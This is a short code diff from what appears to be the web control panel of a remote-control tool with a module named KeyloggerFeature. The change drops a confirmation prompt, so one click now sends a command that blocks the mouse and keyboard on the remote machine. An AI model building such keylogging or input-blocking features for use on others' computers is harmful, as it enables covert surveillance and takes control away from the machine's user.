@@ -114,19 +114,17 @@ export const KeyloggerFeature = {
 
     if (!isInputBlocked) {
       // Block Input
-      if (confirm("Block mouse & keyboard on server?")) {
-        SocketService.send("DISABLE_INPUT");
-        isInputBlocked = true;
+      SocketService.send("DISABLE_INPUT");
+      isInputBlocked = true;
 
-        // Update button appearance
-        if (btn) {
-          btn.className = "btn btn-sm btn-input-toggle me-1 is-blocked";
-        }
-        if (btnText) btnText.innerText = "Unblock";
-        if (btnIcon) btnIcon.className = "fas fa-lock";
-
-        UIManager.showToast("Input blocked", "warning");
+      // Update button appearance
+      if (btn) {
+        btn.className = "btn btn-sm btn-input-toggle me-1 is-blocked";
       }
+      if (btnText) btnText.innerText = "Unblock";
+      if (btnIcon) btnIcon.className = "fas fa-lock";
+
+      UIManager.showToast("Input blocked", "warning");
     } else {
       // Unblock Input - Gửi nhiều lần để đảm bảo Windows unblock thành công
       UIManager.showToast("Unblocking input...", "info");
